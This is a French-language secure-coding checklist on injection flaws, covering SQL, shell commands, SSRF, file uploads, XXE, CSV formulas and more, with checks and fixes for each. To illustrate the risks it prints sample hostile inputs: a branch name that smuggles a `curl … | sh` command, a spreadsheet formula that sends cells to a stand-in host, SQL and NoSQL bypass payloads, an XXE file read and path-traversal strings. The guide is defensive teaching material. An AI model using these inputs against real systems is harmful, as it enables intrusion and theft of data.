# 03 · Entrées hostiles et injections (INJ)

Une injection, c'est une donnée qui devient du code : un nom d'utilisateur qui se transforme en
morceau de requête SQL, en commande système, en HTML ou en formule de tableur. Point de départ :
**tout ce qui vient de l'extérieur est hostile**, qu'il s'agisse d'un formulaire, d'une URL, d'un
en-tête, d'un cookie, d'un webhook, d'un fichier envoyé, de la réponse d'une API tierce ou de la
réponse d'une IA. Deux gestes règlent presque tout : **valider à l'entrée**, côté serveur, avec un
schéma (zod, valibot, pydantic) ; **encoder à la sortie**, selon l'endroit où la donnée atterrit
(paramètre SQL, liste d'arguments, échappement HTML, apostrophe devant une formule). On ne colle
jamais une donnée dans un langage : on la passe à côté.

---

### INJ-01 · Toute entrée est validée côté serveur par un schéma : types, longueurs, formats, champs permis
`bloquant` · `api`

**Pourquoi** — La validation dans le navigateur sert le confort de l'utilisateur ; un attaquant
l'ignore et envoie sa requête à la main. Sans schéma côté serveur, on reçoit un objet là où on
attendait un texte (INJ-11), 10 Mo dans un champ « prénom », un rôle `admin` en prime (INJ-06), une
quantité négative. En TypeScript, un type (`as Commande`) ne vérifie rien au moment où le code
tourne.
**Vérifier** — Chaque point d'entrée (route API, Server Action, Edge Function, Worker, `doPost(e)`
d'Apps Script, consommateur de webhook ou de file) valide-t-il ce qu'il reçoit avant de s'en
servir ? Chercher `await req.json()`, `formData.get()`, `request.get_json()`, `e.parameter` utilisés
tels quels, et les `z.any()`.
**Corriger** — Un schéma par entrée, en liste blanche (on décrit ce qui est permis, tout le reste
est refusé) :
```ts
import { z } from 'zod'
const Entree = z.strictObject({                  // refuse les champs inconnus
  titre: z.string().trim().min(1).max(200),
  visibilite: z.enum(['publique', 'privee']),
  quantite: z.number().int().min(1).max(100),
})
const r = Entree.safeParse(await req.json())
if (!r.success) return Response.json({ erreur: 'Données invalides' }, { status: 400 })
```
Hono : `zValidator('json', Entree)` (`@hono/zod-validator`). FastAPI valide déjà grâce aux modèles
pydantic (ajouter `model_config = ConfigDict(extra="forbid")`) ; avec Flask, pydantic à la main.
Valider aussi la réponse d'une API tierce, le contenu d'un webhook une fois sa signature vérifiée
(API, ASY) et la sortie d'un modèle d'IA (IA) : ce sont des entrées comme les autres. Taille
maximale des corps de requête : API.
**Piège** — Valider, puis utiliser l'objet d'origine (`req.body`) au lieu du résultat validé
(`r.data`). Seul `r.data` est sûr.
**Notions** — Validation des entrées

---

### INJ-02 · Les requêtes SQL sont paramétrées : jamais de concaténation ni de `${}` dans une chaîne SQL
`bloquant` · `bdd` · `auto`

**Pourquoi** — L'injection SQL : la donnée est collée dans la requête et en change le sens.
`"SELECT * FROM users WHERE email = '" + email + "'"` avec `' OR '1'='1` comme e-mail renvoie toute
la table ; avec `'; DROP TABLE users; --`, elle la supprime. C'est l'une des failles les plus
anciennes, et toujours l'une des plus exploitées.
**Vérifier** — `node audit.mjs` (chaînes SQL construites par `+` ou par gabarit `` `…${x}…` ``
passées à `query`, `execute`, `prepare`, `raw`). En Python : f-strings, `%` ou `.format()` dans
`execute()`. Fonctions Postgres avec `EXECUTE` dynamique. Colonnes de tri venues de la requête
(`ORDER BY ${tri}`).
**Corriger** — La donnée voyage à part, en paramètre :
```ts
await env.DB.prepare('SELECT * FROM notes WHERE id = ? AND user_id = ?').bind(id, userId).all() // Cloudflare D1
await pool.query('SELECT * FROM notes WHERE id = $1', [id])                                     // pg
```
```python
cur.execute("SELECT * FROM notes WHERE id = %s", (note_id,))   # psycopg ; sqlite3 utilise ?
```
Un nom de colonne ou un sens de tri ne se paramètre pas : liste blanche
(`({ date: 'created_at', titre: 'title' })[tri] ?? 'created_at'`). En PL/pgSQL :
`EXECUTE format('SELECT * FROM %I WHERE id = $1', nom_table) USING id` (`%I` pour un nom, `%L`
pour une valeur). Avec supabase-js, préférer `.eq()`, `.ilike()`, `.in()` : la chaîne passée à
`.or()` ou `.filter()` est transmise telle quelle, et la doc demande de l'assainir soi-même.
**Piège** — Les gabarits **étiquetés** sont sûrs : `` sql`SELECT … WHERE id = ${id}` ``
(postgres.js, Neon, Drizzle) et `` prisma.$queryRaw`…` `` transforment chaque `${}` en paramètre.
Le scanner les signale par prudence. Ce qui est dangereux, ce sont leurs variantes `sql.unsafe()`,
`sql.raw()`, `$queryRawUnsafe()`, `$executeRawUnsafe()`.
**Notions** — SQL Injection

---

### INJ-03 · Aucune chaîne venue de l'extérieur n'est exécutée comme du code
`bloquant` · `tout` · `auto`

**Pourquoi** — `eval`, `new Function`, `setTimeout("texte")` en JavaScript, `eval` et `exec` en
Python exécutent du texte comme du programme. Si une partie de ce texte vient d'un utilisateur,
d'un fichier ou d'une IA, l'attaquant exécute ce qu'il veut : sur ton serveur (lecture des secrets,
de la base) ou dans le navigateur de tes visiteurs.
**Vérifier** — `node audit.mjs` (`eval(`, `new Function(`, `setTimeout`/`setInterval` avec une
chaîne, `vm.runIn…`). Python : `eval(`, `exec(`, `compile(`. Apps Script : `eval`.
**Corriger** — Il existe presque toujours une façon sans code : `JSON.parse` pour lire des données ;
une table de correspondance pour choisir une fonction (`actions[nom]?.()` sur une liste fermée) ;
une bibliothèque d'expressions maintenue pour une calculatrice ou des formules ;
`ast.literal_eval` en Python pour lire une valeur littérale. Exécuter du code écrit par un
utilisateur ou par une IA demande un vrai bac à sable isolé (IA).
**Piège** — Le module `node:vm` n'est **pas** un bac à sable : sa propre documentation le dit, et
on en sort facilement.
**Notions** — Injection de code

---

### INJ-04 · Les commandes système reçoivent leurs arguments en liste, sans passer par un shell
`bloquant` · `api` · `auto`

**Pourquoi** — L'injection de commande : `` exec(`git log ${branche}`) `` confie la chaîne entière à
un shell (l'interpréteur de commandes). Une « branche » nommée `main; curl pirate.sh | sh` exécute
la seconde commande avec les droits du serveur.
**Vérifier** — `node audit.mjs` (`child_process.exec`/`execSync` avec gabarit ou concaténation,
`spawn(…, { shell: true })`, `subprocess` avec `shell=True`, `os.system`, `os.popen`).
**Corriger** — Le programme, puis la liste de ses arguments, sans shell :
```ts
import { execFile } from 'node:child_process'
execFile('git', ['log', '--oneline', '--', chemin], (err, stdout) => { /* … */ })
```
```python
subprocess.run(["git", "log", "--oneline", "--", chemin], check=True, timeout=30)
```
Le `--` (quand l'outil le comprend) marque la fin des options : une valeur qui commence par `-`
n'est pas prise pour une option (injection d'argument). Valider aussi la valeur (INJ-01, INJ-08).
Mieux encore : une bibliothèque plutôt qu'une commande (`sharp` plutôt qu'ImageMagick).
**Piège** — `shlex.quote()` ou un échappement maison : utile en dernier recours, mais la liste
d'arguments supprime le problème au lieu de le colmater.
**Notions** — Injection de commande

---

### INJ-05 · Une URL fournie de l'extérieur ne peut pas atteindre le réseau interne (SSRF)
`bloquant` · `api`

**Pourquoi** — La SSRF (Server-Side Request Forgery) : l'attaquant fait faire une requête à **ton
serveur**, qui atteint des endroits que lui n'atteint pas. Toute fonction qui « récupère une URL »
est concernée : aperçu de lien, import d'image par URL, webhook sortant dont l'utilisateur choisit
l'adresse, PDF généré à partir d'une page, proxy d'images. Cibles typiques :
`http://169.254.169.254/` (les métadonnées d'un serveur cloud, qui peuvent livrer des identifiants
temporaires ; c'est la voie de la fuite de Capital One en 2019), `localhost:6379` (un Redis sans
mot de passe), une admin interne, les IP privées. La SSRF est au 7e rang de l'OWASP API Top 10
(2023).
**Vérifier** — `fetch(`, `axios`, `got`, `requests.get`, `httpx`, `urllib`, `UrlFetchApp.fetch`,
`page.goto` (Puppeteer, Playwright) dont l'URL vient d'une entrée. Dans `next.config`,
`images.remotePatterns` avec `hostname: '**'`. Les redirections sont-elles suivies sans contrôle ?
**Corriger** — Le plus sûr : une liste blanche de domaines (`['api.github.com', 'i.ytimg.com']`).
Pour une URL libre, quatre barrières :
1. protocole `https:` (et `http:` si besoin), jamais `file:`, `gopher:`, `ftp:` ;
2. résoudre le nom, puis refuser toute adresse privée ou réservée (`127.0.0.0/8`, `10.0.0.0/8`,
   `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `100.64.0.0/10`, `0.0.0.0`, `::1`,
   `fc00::/7`, `fe80::/10`, et les IPv4 déguisées en IPv6 comme `::ffff:127.0.0.1`) avec une
   bibliothèque d'analyse d'IP (`ipaddr.js`, module `ipaddress` de Python), pas une regex ;
3. redirections coupées (`redirect: 'manual'`) ou revérifiées à chaque saut ;
4. délai court, taille de réponse plafonnée, ni réponse brute ni message d'erreur détaillé renvoyés
   à l'utilisateur.
En Node avec axios, got ou node-fetch, `request-filtering-agent` contrôle l'IP réellement contactée,
ce qui déjoue aussi le « DNS rebinding » (un nom qui donne une IP publique au contrôle, puis une IP
interne à la connexion). Un navigateur sans interface qui rend du HTML d'utilisateur doit bloquer
`file://` et le réseau interne.
**Piège** — Le risque dépend de l'hébergement : maximal sur un serveur, une VM ou un conteneur à soi
(VPS, AWS, GCP, Docker), plus faible sur Workers ou Vercel. Même là, la requête peut viser tes
autres services ou frapper des tiers en ton nom.
**Notions** — SSRF

---

### INJ-06 · On n'écrit en base que les champs prévus (mass assignment)
`bloquant` · `bdd`

**Pourquoi** — Le mass assignment (affectation en masse) : le code enregistre tout l'objet reçu,
`update(req.body)`. L'utilisateur qui change son pseudo ajoute `"role": "admin"`, `"credits": 99999`
ou `"user_id": "<l'id d'un autre>"` à sa requête, et ces champs sont écrits aussi. L'OWASP le range,
avec l'envoi de champs en trop, dans « Broken Object Property Level Authorization » (3e rang de
l'API Top 10, 2023).
**Vérifier** — Écritures qui reçoivent un objet entier venu du client : `update(req.body)`,
`create({ data: body })`, `{ ...body }`, `Object.assign(user, body)`,
`.update(await req.json())` (supabase-js), `Model(**request.json)`, `setattr` en boucle. Avec
Supabase : quelles colonnes le rôle `authenticated` peut-il modifier ?
**Corriger** — Choisir explicitement les champs :
```ts
const { pseudo, bio } = ProfilModif.parse(await req.json()) // schéma limité aux champs modifiables (INJ-01)
await supabase.from('profiles').update({ pseudo, bio }).eq('id', userId)
```
En Python, un modèle pydantic d'entrée distinct du modèle stocké (`ProfilModif` sans `role` ni
`credits`). En filet côté Supabase, des droits par colonne
(`grant update (pseudo, bio) on public.profiles to authenticated`, voir IAM-05). Prix, total d'un
panier ou remise se recalculent côté serveur, jamais lus dans la requête (API).
**Piège** — zod retire les champs inconnus par défaut, sauf avec `.passthrough()`,
`z.looseObject()` ou `z.record()` : ces formes laissent tout passer.
**Notions** — Mass assignment, Validation des entrées

---

### INJ-07 · Les fichiers envoyés sont vérifiés par leur contenu, limités, renommés et rangés hors du dossier servi
`bloquant` · `fichiers`

**Pourquoi** — Un fichier est une entrée comme une autre, en plus gros. Un `.html` ou un `.php`
déposé dans un dossier servi s'affiche ou s'exécute sur ton domaine. Un SVG est une image qui peut
contenir du JavaScript : sans effet dans une balise `<img>`, mais exécuté dès qu'on ouvre le
fichier à son adresse (XSS). Un nom `../../.env` écrase autre chose (INJ-08), un fichier de 5 Go
remplit le disque, une photo garde la position GPS de qui l'a prise.
**Vérifier** — Où arrivent les fichiers (`public/`, `static/`, `uploads/` servis par le site ?) ; le
type est-il déduit de l'extension ou du `Content-Type` envoyé par le client (tous deux
falsifiables) ; taille maximale ; nom d'origine réutilisé ; SVG et HTML acceptés ; règles du
stockage (Supabase Storage : policies sur `storage.objects`, types et taille du bucket).
**Corriger** —
- **Type** lu dans les premiers octets du fichier : `fileTypeFromBuffer` (paquet `file-type`),
  `filetype` ou `python-magic` en Python ; liste blanche (`image/png`, `image/jpeg`, `image/webp`,
  `application/pdf`).
- **Taille** plafonnée avant lecture complète : `multer({ limits: { fileSize: 5 * 1024 * 1024 } })`,
  `serverActions.bodySizeLimit` dans Next.js (1 Mo par défaut).
- **Nom** regénéré (`crypto.randomUUID() + '.png'`) ; le nom d'origine reste en base, pour
  l'affichage seulement.
- **Stockage** objet (Supabase Storage, R2, S3) ou dossier non servi, jamais exécutable ; fichiers
  privés lus par URL signée de courte durée.
- **Service** avec `X-Content-Type-Options: nosniff`, et `Content-Disposition: attachment` pour tout
  ce qui n'est pas une image affichée.
- **Images** réencodées (`sharp` retire les métadonnées par défaut) ; **SVG** refusés, convertis en
  PNG, ou désinfectés (DOMPurify) et servis depuis un autre domaine (WEB-18).

Pour que les gros fichiers ne transitent pas par ton serveur : URL d'envoi signée
(`createSignedUploadUrl` chez Supabase, URL présignée S3 ou R2).
**Piège** — L'attribut `accept="image/*"` du champ de fichier ne filtre que dans le navigateur :
n'importe qui l'enlève. Les restrictions d'un bucket sont un filet utile ; vérifier si elles se
fondent sur le type annoncé ou sur le contenu réel.
**Notions** — Upload de fichiers, XSS, Path traversal

---

### INJ-08 · Un chemin construit à partir d'une entrée reste dans le dossier prévu (path traversal)
`bloquant` · `api`

**Pourquoi** — Le path traversal (remonter l'arborescence des dossiers) :
`GET /telecharger?fichier=../../.env` avec `path.join('uploads', fichier)` sert ton fichier de
secrets. Variantes : chemin absolu (`/etc/passwd`), encodé (`..%2f`), séparateur Windows (`..\`).
**Vérifier** — `path.join`, `path.resolve`, `fs.readFile`, `res.sendFile`, `open()`, `send_file`
dont un morceau vient de la requête. Même question pour les clés de stockage objet construites avec
une entrée (`${userId}/${nom}`).
**Corriger** — Le mieux : ne jamais se servir de l'entrée comme chemin, mais d'un identifiant qui
pointe vers un chemin enregistré en base. Sinon, résoudre puis vérifier qu'on est toujours dedans :
```ts
const base = path.resolve('uploads')
const cible = path.resolve(base, nom)
if (!cible.startsWith(base + path.sep)) throw new Error('Chemin refusé')
```
```python
cible = (BASE / nom).resolve()
if not cible.is_relative_to(BASE.resolve()): abort(400)   # Python 3.9+
```
Les fonctions prévues pour ça font la vérification : `res.sendFile(nom, { root: dossier })`
(Express), `send_from_directory` (Flask).
**Piège** — Tester `nom.includes('..')` : on le contourne par encodage ou par lien symbolique.
Résoudre, puis comparer.
**Notions** — Path traversal

---

### INJ-09 · Aucune donnée externe n'est désérialisée avec un format capable d'exécuter du code
`bloquant` · `api` · `auto`

**Pourquoi** — Désérialiser, c'est reconstruire un objet à partir d'octets. Certains formats savent
reconstruire **n'importe quel objet**, y compris un objet qui lance une commande à sa création :
`pickle` en Python (sa documentation interdit de l'utiliser sur des données non fiables),
`yaml.load` avec un chargeur complet, `node-serialize`. Lire ainsi un fichier envoyé par un
utilisateur, ou un cookie, revient à le laisser exécuter du code sur le serveur.
**Vérifier** — `node audit.mjs` (`pickle.loads`, `pickle.load`, `yaml.load` sans `SafeLoader`,
`yaml.unsafe_load`, `jsonpickle.decode`, `node-serialize`). Aussi : `joblib.load`, `torch.load`
(modèles d'IA téléchargés), `shelve`, `marshal`.
**Corriger** — JSON pour échanger des données (`JSON.parse`, `json.loads`), suivi d'une validation
par schéma (INJ-01). YAML : `yaml.safe_load()` en Python ; en JS, `js-yaml` 4 et le paquet `yaml`
ne créent pas de types dangereux par défaut. Modèles d'IA : format `safetensors`, ou
`torch.load(…, weights_only=True)`, le défaut depuis PyTorch 2.6.
**Piège** — Un fichier « à nous » qui passe par l'utilisateur (cookie, champ caché, export
réimporté) est une donnée externe : il a pu être modifié entre-temps.
**Notions** — Désérialisation non sûre

---

### INJ-10 · L'entrée est une variable du modèle, jamais le modèle lui-même (template injection)
`bloquant` · `api`

**Pourquoi** — Un moteur de modèles (Jinja2, Nunjucks, Handlebars, EJS, le HtmlService d'Apps
Script) mélange texte et code. Si l'utilisateur écrit le **modèle**, et pas seulement les valeurs,
il écrit du code : `{{ 7*7 }}` affiche 49, et des charges connues vont jusqu'à exécuter des
commandes sur le serveur avec Jinja2.
**Vérifier** — `render_template_string(` avec une variable, `Template(entree)`,
`nunjucks.renderString(entree)`, `Handlebars.compile(entree)`, `ejs.render(entree)`,
`HtmlService.createTemplate(entree)` en Apps Script. Modèles d'e-mail ou de page personnalisables
par les utilisateurs. Objets de requête passés entiers au rendu (`res.render('page', req.query)`),
qui peuvent glisser des options du moteur.
**Corriger** — Le modèle est un fichier fixe du projet ; l'entrée est passée en variable :
```python
return render_template("bonjour.html", nom=nom)   # et non render_template_string(f"Bonjour {nom}")
```
Passer au rendu un objet construit à la main, jamais `req.query` ou `req.body` entiers. Si des
utilisateurs doivent vraiment écrire des modèles : un langage sans logique prévu pour ça (Liquid,
le langage des thèmes Shopify, ou Mustache), ou le `SandboxedEnvironment` de Jinja2, tenu à jour.
**Notions** — Template injection

---

### INJ-11 · Les filtres NoSQL ne reçoivent que des valeurs simples, jamais un objet venu de la requête
`important` · `bdd`

**Pourquoi** — MongoDB reçoit ses filtres sous forme d'objets. Si le code passe
`{ email: req.body.email, password: req.body.password }` et que l'attaquant envoie
`{"password": {"$ne": null}}`, le filtre devient « mot de passe différent de rien » : connexion sans
mot de passe. Express 4 transforme même `?password[$ne]=x` en objet (Express 5 ne le fait plus par
défaut pour l'URL), et un corps JSON peut toujours en contenir.
**Vérifier** — Valeurs de `req.body`, `req.query`, `request.json` passées directement à `find`,
`findOne`, `updateOne`, `aggregate`. Usage de `$where` (du JavaScript exécuté par la base). Clés
Cloudflare KV ou de cache construites avec une entrée (`` env.KV.get(`user:${id}`) ``).
**Corriger** — Un schéma qui impose des chaînes (`z.string()` refuse un objet, INJ-01). Mongoose :
`mongoose.set('sanitizeFilter', true)`, et Mongoose tenu à jour (un contournement par `$nor` a été
corrigé en 2026, CVE-2026-42334). Jamais de `$where`. Clés KV ou de cache : format validé
(`/^[a-z0-9-]{1,64}$/`), pour qu'une entrée ne vise pas la clé d'un autre.
**Notions** — NoSQL injection, Validation des entrées

---

### INJ-12 · Les redirections après connexion ou action ne mènent que vers ton propre site (open redirect)
`important` · `web`

**Pourquoi** — L'open redirect (redirection ouverte) :
`https://tonsite.fr/login?next=https://tonsite-securite.com` renvoie, après connexion, vers un faux
site. Le lien commence par ton vrai domaine, donc il inspire confiance dans un e-mail
d'hameçonnage. Dans un flux OAuth, la même faiblesse peut faire fuir un code ou un jeton (IAM-14).
**Vérifier** — Paramètres `next`, `redirect`, `redirectTo`, `returnUrl`, `callback`, `continue`
passés à `redirect()`, `res.redirect`, `NextResponse.redirect`, `window.location`.
**Corriger** — N'accepter que des chemins internes, ou une liste blanche :
```ts
function cheminSur(next: string | null) {
  if (!next || !next.startsWith('/') || next.startsWith('//') || next.startsWith('/\\')) return '/'
  return next
}
```
Ou comparer l'origine : `new URL(next, APP_URL).origin === new URL(APP_URL).origin`. Supabase
vérifie `redirectTo` contre sa liste d'URL autorisées : la garder stricte (IAM-14).
**Piège** — `//pirate.com` et `/\pirate.com` ressemblent à des chemins, mais les navigateurs les
lisent comme une autre adresse. D'où les deux tests en plus.
**Notions** — Open redirect

---

### INJ-13 · URL absolues, IP du client et en-têtes envoyés ne dépendent pas d'en-têtes falsifiables
`important` · `api`

**Pourquoi** — Les en-têtes d'une requête sont écrits par le client. `Host` ou `X-Forwarded-Host`
servent à fabriquer un lien de réinitialisation qui pointe chez l'attaquant (IAM-13) ;
`X-Forwarded-For` falsifié contourne une limite par IP ou salit les journaux. Dans l'autre sens,
une entrée qui contient un retour à la ligne (`\r\n`), glissée dans un en-tête de réponse ou
d'e-mail, peut ajouter des en-têtes : un `Set-Cookie`, ou un `Bcc:` qui transforme ton formulaire
de contact en relais de spam.
**Vérifier** — `req.headers.host`, `req.get('host')`, `headers().get('host')`, `request.host_url`
utilisés pour construire des liens ; `x-forwarded-for` lu sans réglage du proxy ; en-têtes de
réponse (`Content-Disposition`, `Location`) ou d'e-mail (`Subject`, `From`, `Reply-To`) qui
contiennent une entrée.
**Corriger** — Les URL absolues viennent de la configuration (`APP_URL`, SEC-12). L'IP du client
vient de l'en-tête posé par la plateforme : `CF-Connecting-IP` sur Cloudflare, `x-forwarded-for`
sur Vercel (réécrit par Vercel pour empêcher l'usurpation) ; en Express,
`app.set('trust proxy', 1)` seulement si un proxy connu est devant. Retirer `\r` et `\n` de toute
valeur mise dans un en-tête ; nom de fichier de téléchargement nettoyé et encodé
(`filename*=UTF-8''…`). Le module `http` de Node refuse déjà les caractères interdits dans un
en-tête : le risque vient surtout des en-têtes et des e-mails construits à la main.
**Notions** — Injection d'en-têtes

---

### INJ-14 · Aucun objet venu de l'extérieur n'est fusionné en profondeur sans filtre (prototype pollution)
`important` · `api`

**Pourquoi** — En JavaScript, presque tous les objets héritent d'un objet commun,
`Object.prototype`. Une fonction de fusion profonde (deep merge) qui recopie
`{"__proto__": {"isAdmin": true}}` reçu en JSON écrit `isAdmin` sur **tous** les objets de
l'application : chaque `user.isAdmin` jamais défini devient vrai. Selon le code, cela va du
contournement de droits jusqu'à l'exécution de code.
**Vérifier** — Fonctions `merge`, `deepMerge`, `extend`, `set(obj, chemin, valeur)` écrites à la
main ou anciennes versions de bibliothèques de fusion, appliquées à des données externes. Clés
dynamiques écrites à partir d'une entrée (`obj[cle1][cle2] = valeur`).
**Corriger** — Valider avec un schéma avant toute fusion (zod ne garde que les clés déclarées).
Refuser les clés `__proto__`, `constructor` et `prototype` dans toute fonction qui écrit par
chemin. `Map` ou `Object.create(null)` pour un dictionnaire dont les clés viennent de
l'utilisateur ; `structuredClone` pour copier. Garder les bibliothèques à jour (LIV). En filet,
lancer Node avec `--disable-proto=delete` retire `__proto__` (mais pas le chemin
`constructor.prototype`).
**Piège** — `JSON.parse` ne pollue rien à lui seul : il crée une clé `__proto__` ordinaire. C'est la
fusion ou la copie qui suit qui fait les dégâts.
**Notions** — Prototype pollution

---

### INJ-15 · Aucune expression régulière ne peut être bloquée par une entrée piégée (ReDoS)
`important` · `api`

**Pourquoi** — Certaines regex mal construites prennent un temps qui explose avec la longueur du
texte (retour arrière catastrophique) : `^(a+)+$` appliquée à une trentaine de « a » suivis d'un
« ! » peut occuper le processeur plusieurs secondes. Node.js ne traite qu'une chose à la fois sur
son fil principal : une seule requête de ce genre fige le serveur pour tout le monde. C'est le
ReDoS (déni de service par regex). Même risque si l'utilisateur fournit lui-même le motif
(`new RegExp(recherche)`).
**Vérifier** — Regex appliquées à une entrée, surtout avec des quantificateurs imbriqués
(`(a+)+`, `(.*a){n}`, `(\w+\s?)*`). Outils : la règle `regexp/no-super-linear-backtracking`
d'`eslint-plugin-regexp`, ou `recheck`. `new RegExp(` construit avec une entrée.
**Corriger** — Limiter la longueur avant la regex (`z.string().max(200)`). Réécrire les motifs
dangereux sans imbrication. Pour une recherche de texte : `includes()`, ou `RegExp.escape(texte)`
(navigateurs récents, Node 24+). Pour des motifs fournis par les utilisateurs : un moteur sans
retour arrière, `re2` (paquet npm) ou `google-re2` (Python). Les contraintes `pattern` de pydantic 2
passent déjà par un moteur de ce type.
**Piège** — Valider un e-mail avec une regex géante trouvée en ligne : plusieurs sont vulnérables.
`z.email()` ou un motif simple, puis un e-mail de confirmation, valident mieux.
**Notions** — ReDoS

---

### INJ-16 · Une archive décompressée ne peut ni sortir de son dossier ni exploser en taille (zip slip)
`important` · `fichiers`

**Pourquoi** — Le zip slip : une archive (zip, tar) contient une entrée nommée
`../../app/server.js` ; la décompresser sans contrôle écrit hors du dossier prévu et peut remplacer
du code. La « bombe zip », elle, pèse quelques Ko compressée et des Go une fois décompressée. Les
liens symboliques dans une archive tar servent aussi à écrire ailleurs.
**Vérifier** — Décompression d'archives fournies par des utilisateurs (`adm-zip`, `unzipper`,
`yauzl`, `tar`, `zipfile`, `tarfile`, `shutil.unpack_archive`). Contrôle du chemin de chaque
entrée, de la taille totale, du nombre de fichiers.
**Corriger** — Pour chaque entrée, la vérification d'INJ-08 (résoudre le chemin cible, vérifier
qu'il reste dans le dossier). Plafonds sur la taille décompressée totale, le nombre d'entrées et la
taille par fichier, en comptant les octets réellement écrits (pas la taille annoncée par
l'archive). Liens symboliques refusés. En Python, `tarfile.extractall(dest, filter='data')`
(Python 3.12+) refuse chemins absolus, sorties du dossier et fichiers spéciaux : toujours le passer
explicitement.
**Notions** — Zip slip, Path traversal

---

### INJ-17 · Les données écrites dans un tableur ou un export CSV ne deviennent pas des formules
`important` · `tout`

**Pourquoi** — L'injection de formule (ou « CSV injection ») : un utilisateur saisit
`=HYPERLINK("https://pirate.example/?d="&A2)` comme nom. Quand l'export s'ouvre dans Excel,
LibreOffice ou Google Sheets, la cellule devient une formule : lien piégé, ou envoi d'autres
cellules vers un serveur externe (`IMPORTXML`, `IMAGE` dans Google Sheets, qui demandent toutefois
qu'un éditeur clique sur « Autoriser l'accès »). En Apps Script, `setValue()` et `appendRow()`
interprètent comme une formule tout texte qui commence par `=`.
**Vérifier** — Exports CSV ou Excel contenant des saisies d'utilisateurs ; scripts Apps Script qui
écrivent des réponses de formulaire ou de webhook dans une feuille (`setValue`, `setValues`,
`appendRow`) ; appels à l'API Google Sheets avec `valueInputOption: 'USER_ENTERED'`.
**Corriger** — Neutraliser les cellules qui commencent par `=`, `+`, `-`, `@`, une tabulation ou un
retour chariot, en les préfixant d'une apostrophe :
```js
const sur = v => (typeof v === 'string' && /^[=+\-@\t\r]/.test(v) ? "'" + v : v)
feuille.appendRow([sur(nom), sur(message)])
```
Avec l'API Google Sheets : `valueInputOption: 'RAW'` (les valeurs sont stockées telles quelles,
sans être interprétées). Dans un CSV, mettre aussi chaque champ entre guillemets.
**Piège** — Le préfixe transforme un nombre négatif en texte (`'-5`). L'appliquer aux champs de
texte libre, pas aux montants calculés par ton code.
**Notions** — Injection de formule, Encodage de sortie

---

### INJ-18 · Les analyseurs XML refusent les entités externes (XXE)
`important` · `fichiers`

**Pourquoi** — XML permet de déclarer des « entités » qui vont chercher un contenu ailleurs :
`<!ENTITY x SYSTEM "file:///etc/passwd">`. Un analyseur qui les résout lit des fichiers du serveur
ou fait des requêtes internes (SSRF, INJ-05) : c'est la XXE (XML External Entity). Des entités
imbriquées peuvent aussi faire exploser la mémoire (attaque « billion laughs »). Sont du XML sans
en avoir l'air : SVG, DOCX, XLSX, flux RSS, sitemaps, SAML.
**Vérifier** — Où le projet lit-il du XML venu de l'extérieur, avec quelle bibliothèque et quelles
options (`noent: true` de `libxmljs`, `resolve_entities` de lxml) ?
**Corriger** — Préférer JSON quand on a le choix. En Python, `defusedxml` à la place de
`xml.etree`, `xml.dom.minidom` ou `lxml` pour toute entrée externe. En Node, `fast-xml-parser` ne
résout pas les entités externes ; avec `libxmljs`, ne jamais activer `noent`. Pour SAML, une
bibliothèque maintenue et à jour, jamais d'analyse maison.
**Notions** — XXE, SSRF

---

### INJ-19 · Une entrée ne peut ni falsifier ni piéger les journaux (log injection)
`conseillé` · `prod`

**Pourquoi** — `console.log("Connexion échouée pour " + email)` : si l'e-mail contient un retour à
la ligne suivi de `Connexion réussie pour admin`, le journal raconte une fausse histoire. Des
caractères de contrôle peuvent aussi brouiller un terminal, et un journal affiché dans une page
d'admin peut porter un XSS. Cas extrême, en Java : Log4Shell (2021), où un simple texte journalisé
faisait charger et exécuter du code distant.
**Vérifier** — Journaux en texte libre concaténé avec des entrées ; affichage des journaux dans une
interface web.
**Corriger** — Journaux structurés en JSON (`pino` en Node, `structlog` ou `logging` avec un
formateur JSON en Python) : les valeurs y sont échappées et séparées du message. Entrées longues
coupées, caractères de contrôle retirés. Échappement à l'affichage dans l'admin (WEB-01). Ce qu'on
écrit ou non dans les journaux (secrets, données personnelles) : SEC-11, OBS, LEG.
**Notions** — Log injection

---

### INJ-20 · Pare-feu applicatif, proxy sortant filtrant, antivirus des fichiers : quand le volume le justifie
`conseillé` · `échelle`

**Pourquoi** — Ces protections ajoutent une couche par-dessus tout ce qui précède, jamais à la
place. Un WAF (pare-feu applicatif web, comme les règles gérées de Cloudflare) arrête les attaques
connues avant ton code ; un proxy sortant filtrant (Smokescreen, publié par Stripe, ou un pare-feu
de sortie) impose à tous les services une même politique anti-SSRF ; l'analyse antivirus protège
ceux qui téléchargent ce que d'autres ont envoyé. Chacun coûte en réglages, en faux positifs, et
parfois en argent.
**Vérifier** — Plusieurs services font-ils des requêtes sortantes vers des URL d'utilisateurs ? Des
fichiers sont-ils partagés entre utilisateurs, en volume ? Le trafic attire-t-il des attaques
automatisées ?
**Corriger** — Tant que ce n'est pas le cas, INJ-01 à INJ-19 suffisent ; activer seulement les
protections gratuites de l'hébergeur (jeu de règles gérées gratuit de Cloudflare). Au-delà : WAF
avec règles gérées, d'abord en mode « journaliser » puis « bloquer » ; proxy de sortie pour les
services qui récupèrent des URL ; analyse des fichiers (ClamAV ou service de l'hébergeur) avant de
les rendre téléchargeables par d'autres.
**Piège** — Croire qu'un WAF remplace les requêtes paramétrées : il se contourne par encodage, et
ne voit rien de ce qui passe par un canal qu'il n'inspecte pas.
**Notions** — SQL Injection, SSRF, Upload de fichiers
